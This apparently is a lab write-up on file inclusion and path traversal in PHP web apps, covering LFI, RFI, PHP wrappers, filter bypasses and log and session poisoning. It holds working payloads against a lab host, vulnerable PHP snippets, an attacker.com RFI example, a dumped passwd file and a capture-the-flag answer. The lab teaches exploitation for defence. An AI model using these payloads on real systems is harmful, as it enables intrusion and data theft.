# file-inclusion-and-path-traversal


																File Inclusion, Path Traversal



Introduction
------------
File Inclusion and Path Traversal are vulnerabilities that arise when an application allows external input to change the path for accessing files. For example, imagine a library where the catalogue system is manipulated to access restricted books not meant for public viewing. Similarly, in web applications, the vulnerabilities primarily arise from improper handling of file paths and URLs. These vulnerabilities allow attackers to include files not intended to be part of the web application, leading to unauthorized access or execution of code.

Objectives
----------
Understand what File Inclusion and Path Traversal attacks are and their impact.
Identify File Inclusion and Path Traversal vulnerabilities in web applications.
Exploit these vulnerabilities in a controlled environment.
Understand and apply measures to mitigate and prevent these vulnerabilities.


Web Application Architecture
----------------------------

Structure of a Web Application
------------------------------
Web applications are complex systems comprising several components working together to deliver a seamless user experience. At its core, a web application has two main parts: the frontend and the backend.

Frontend: This is the user interface of the application, typically built using frameworks like React, Angular, or Vue.js. It communicates with the backend via APIs.

Backend: This server-side component processes user requests, interacts with databases, and serves data to the frontend. It's often developed using languages like PHP, Python, and Javascript and frameworks like Node.js, Django, or Laravel.

One of the fundamental aspects of web applications is the client-server model. In this model, the client, usually a web browser, sends a request to the server hosting the web application. The backend server then processes this request and sends back a response. The client and server communication usually happens over the HTTP/HTTPS protocols.

Server-Side Scripting and File Handling
---------------------------------------
Server-side scripts run on the server and generate the content of the frontend, which is then sent to the client. Unlike client-side scripts like JavaScript in the browser, server-side scripts can access the server's file system and databases. File handling is a significant part of server-side scripting. Web applications often need to read from or write to files on the server. For example, reading configuration files, saving user uploads, or including code from other files.

For example, the application below includes a file based on user input. 


If this input is not correctly validated and sanitized, an attacker might exploit the vulnerable parameter to include malicious files or access sensitive files on the server. In this case, the attacker could view the contents of the server's passwd file.

In short, file inclusion and path traversal vulnerabilities arise when user inputs are not properly sanitized or validated. Since attackers can inject malicious payloads to log files /var/log/apache2/access.log and manipulate file paths to execute the logged payload, an attacker can achieve remote code execution. An attacker may also read configuration files that contain sensitive information, like database credentials, if the application returns the file in plaintext. Lastly, insufficient error handling may also reveal system paths or file structures, providing clues to attackers about potential targets for path traversal or file inclusion attacks.


File Inclusion Types
--------------------

Basics of File Inclusion
------------------------
A traversal string, commonly seen as ../, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example, include('./folder/file.php') implies that file.php is located inside a folder named folder, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example, /var/www/html/folder/file.php is an absolute path.

Remote File Inclusion
---------------------
Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like include.php?page=http://attacker.com/exploit.php, an attacker can replace the URL with a path to a malicious script.

Local File Inclusion
--------------------
Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like include.php?page=../../../../etc/passwd.

While LFI primarily leads to unauthorized file access, it can escalate to RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.

RFI vs LFI Exploitation Process
-------------------------------

This diagram above differentiates the process of exploiting RFI and LFI vulnerabilities. In RFI, the focus is on including and executing a remote file, whereas, in LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.


What kind of pathing refers to locating files based on the current directory?
Answer: Relative pathing

What kind of pathing involves the file's complete path, which usually starts from the root directory?
Answer: Absolute pathing


PHP Wrappers
-----------

PHP Wrappers
PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.

For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the php://filter filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like /etc/passwd in base64. This can be achieved by using the convert.base64-encode conversion filter of the wrapper. The final payload will then be php://filter/convert.base64-encode/resource=/etc/passwd

For example, go to http://10.10.31.58/playground.php and use the final payload above.

Once the application processes this payload, the server will return an encoded content of the passwd file.

Which the attacker can then decode to reveal the contents of the target file.

There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.

For example, the table below represents the output of the target file .htaccess using the different string filters in PHP.

Data Wrapper
The data stream wrapper is another example of PHP's wrapper functionality. The data:// wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

For example, go to http://10.10.31.58/playground.php and use the payload data:text/plain,<?php%20phpinfo();%20?>. In the below image, this URL could cause PHP code execution, displaying the PHP configuration details.

The breakdown of the payload data:text/plain,<?php phpinfo(); ?> is:

data: as the URL.
mime-type is set as text/plain.
The data part includes a PHP code snippet: <?php phpinfo(); ?>.

http://10.10.31.58/playground.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%2520phpinfo%28%29%3B%2520%3F%3E
php://filter/convert.base64-encode/resource=/etc/passwd

 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDk6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpsYW5kc2NhcGU6eDoxMTA6MTE1OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTExOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKZWMyLWluc3RhbmNlLWNvbm5lY3Q6eDoxMTI6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KdWJ1bnR1Ong6MTAwMDoxMDAwOlVidW50dTovaG9tZS91YnVudHU6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnRyeWhhY2ttZTp4OjEwMDE6MTAwMTosLCw6L2hvbWUvdHJ5aGFja21lOi9iaW4vYmFzaApteXNxbDp4OjExMzoxMTk6TXlTUUwgU2VydmVyLCwsOi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==

 https://www.base64decode.org/

 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false

Base Directory Breakouts
------------------------

Base Directory Breakout
In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file traversal strings to protect the application from file traversal attacks:

function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}


It's possible to comply with this requirement and navigate to other directories. This can be achieved by appending the necessary directory traversal sequences after the mandatory base folder.

For example, go to http://10.10.31.58/lfi.php and use the payload /var/www/html/..//..//..//etc/passwd.

The PHP function containsStr checks if a substring exists within a string. The if condition checks two things. First, if $_GET['page'] does not contain the substring ../.., and if $_GET['page'] contains the substring /var/www/html, however, ..//..// bypasses this filter because it still effectively navigates up two directories, similar to ../../. It does not exactly match the blocked pattern ../.. due to the extra slashes. The extra slashes // in ..//..// are treated as a single slash by the file system. This means ../../ and ..//..// are functionally equivalent in terms of directory navigation but only ../../ is explicitly filtered out by the code.


Encoding
Encoding techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences like ../. However, attackers can often evade detection by encoding these sequences and still navigate through the server's filesystem.

Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, ../ can be encoded in several ways to bypass simple filters.

Standard URL Encoding: ../ becomes %2e%2e%2f
Double Encoding: Useful if the application decodes inputs twice. ../ becomes %252e%252e%252f
For example, imagine an application that mitigates LFI by filtering out ../

$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);

An attacker can bypass this filter using encoded representations:

URL Encoded Bypass: The attacker can use the URL-encoded version of the payload like ?file=%2e%2e%2fconfig.php. The server decodes this input to ../config.php, bypassing the filter.

Double Encoded Bypass: The attacker can use double encoding if the application decodes inputs twice. The payload would then be ?file=%252e%252e%252fconfig.php, where a dot is %252e, and a slash is %252f. The first decoding step changes %252e%252e%252f to %2e%2e%2f. The second decoding step then translates it to ../config.php.



LFI2RCE - Session Files
-----------------------

PHP Session Files
PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.

For example, the vulnerable application hosted in http://10.10.31.58/sessions.php contains the below code:

if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}


An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using <?php echo phpinfo(); ?> in the page parameter.

This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser.


Accessing the URL sessions.php?page=/var/lib/php/sessions/sess_[sessionID] will execute the injected PHP code in the session file. Note that you have to replace [sessionID] with the value from your PHPSESSID cookie.

LFI2RCE - Log Poisoning
-----------------------

Log Poisoning
Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.

For example, if an attacker sends a Netcat request to the vulnerable machine containing a PHP code:

The code will then be logged in the server's access logs.

The attacker then uses LFI to include the access log file: ?page=/var/log/apache2/access.log


To replicate the above demo, you may head to http://10.10.31.58/playground.php 


http://10.10.31.58/playground.php?page=%2Fvar%2Flog%2Fapache2%2Faccess.log

10.10.87.109 - - [31/Jan/2024:07:25:10 +0000] "GET / HTTP/1.1" 200 1113 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:25:10 +0000] "GET /templates/bootstrap.min.js HTTP/1.1" 200 15796 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:25:10 +0000] "GET /templates/bootstrap.min.css HTTP/1.1" 200 23582 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:25:10 +0000] "GET /templates/jquery.min.js HTTP/1.1" 200 33657 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:25:10 +0000] "GET /favicon.ico HTTP/1.1" 404 489 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:05 +0000] "GET /playground.php HTTP/1.1" 200 1251 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:05 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:05 +0000] "GET /bootstrap.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:05 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:10 +0000] "GET /playground.php?page=%27 HTTP/1.1" 200 1190 "http://10.10.31.58/playground.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:10 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=%27" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:10 +0000] "GET /bootstrap.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=%27" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:10 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=%27" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:14 +0000] "GET /playground.php HTTP/1.1" 200 1250 "http://10.10.31.58/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:26 +0000] "GET /playground.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%2520phpinfo%28%29%3B%2520%3F%3E HTTP/1.1" 200 24543 "http://10.10.31.58/playground.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:26 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%2520phpinfo%28%29%3B%2520%3F%3E" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:26 +0000] "GET /bootstrap.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%2520phpinfo%28%29%3B%2520%3F%3E" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:27 +0000] "GET /jquery.min.js HTTP/1.1" 404 489 "http://10.10.31.58/playground.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%2520phpinfo%28%29%3B%2520%3F%3E" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" 10.10.87.109 - - [31/Jan/2024:07:29:51 +0000] "GET / HTTP/1.1" 200 1113 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 



thm{fl4g_cd3c67e5079de2700af6cea0a405f9cc}
